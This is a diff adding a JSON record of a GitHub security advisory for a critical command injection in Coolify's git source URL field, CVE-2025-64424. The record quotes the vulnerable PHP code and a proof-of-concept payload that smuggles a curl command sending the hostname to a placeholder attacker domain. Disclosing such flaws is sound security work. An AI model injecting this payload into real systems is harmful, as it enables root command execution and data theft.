@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-qx24-jhwj-8w6x",
+  "repo": {
+    "cve_id": "CVE-2025-64424",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 9.4,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+      }
+    },
+    "cwe_ids": [
+      "CWE-77"
+    ],
+    "description": "### Summary\r\nA command injection vulnerability was found in the git source input fields of a resource, allowing a low privileged user (member) to execute system commands as root on the Coolify instance.\r\n\r\n### PoC\r\nBelow are snippets of the vulnerable code:\r\n\r\n```php\r\nfunction executeInDocker(string $containerId, string $command) { return \"docker exec {$containerId} bash -c '{$command}'\"; } \r\n```\r\n- at coolify/bootstrap/helpers/docker.php:120\r\n\r\nAnd\r\n\r\n```php\r\n$this->execute_remote_command( [ executeInDocker($this->deployment_uuid, \"GIT_SSH_COMMAND=\\\"ssh -o ConnectTimeout=30 -p {$this->customPort} -o Port={$this->customPort} -o LogLevel=ERROR -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\\\" git ls-remote {$this->fullRepoUrl} {$lsRemoteRef}\"), 'hidden' => true, 'save' => 'git_commit_sha', ], ); \r\n```\r\n- at coolify/app/Jobs/ApplicationDeploymentJob.php:1690\r\n\r\nWe used the following payload in the project's git source repository URL (the domain should be replaced with your own, to receive the data in your domain logs):\r\n\r\n```bash\r\n;';curl https://my-attacker-domain/ -X POST --data `hostname`;echo '\r\n```\r\n\r\n<img width=\"1802\" height=\"258\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4f93a050-0cbd-459b-afa8-0b74df604d7d\" />\r\n\r\nAfter deploying the project, the command is executed and data is exfiltrated to the attacker's server.\r\n\r\n<img width=\"2322\" height=\"655\" alt=\"image\" src=\"https://github.com/user-attachments/assets/828687fa-58a5-44af-b3dd-6306d2d46380\" />\r\n\r\nWe hosted Coolify via Hetzner with hostname `coolify-ubuntu-2gb-hel1-1`. This is also the hostname that we were able to exfiltrate using this technique.\r\n\r\nThe video PoC was too large to upload here, so we're including a link to our Google Drive:\r\nhttps://drive.google.com/file/d/1rk7AYxNDkJUwo8uWbzX62PpBxpDYeyrZ/view?usp=drive_link\r\n\r\n### Impact\r\nRun commands as root on the Coolify instance\r\n",
+    "ghsa_id": "GHSA-qx24-jhwj-8w6x",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-qx24-jhwj-8w6x",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-qx24-jhwj-8w6x"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2025-64424"
+      }
+    ],
+    "published_at": "2026-01-03T15:15:53Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Command injection in project git source",
+    "updated_at": "2026-01-03T15:15:53Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "Coolify"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= v4.0.0-beta.434"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
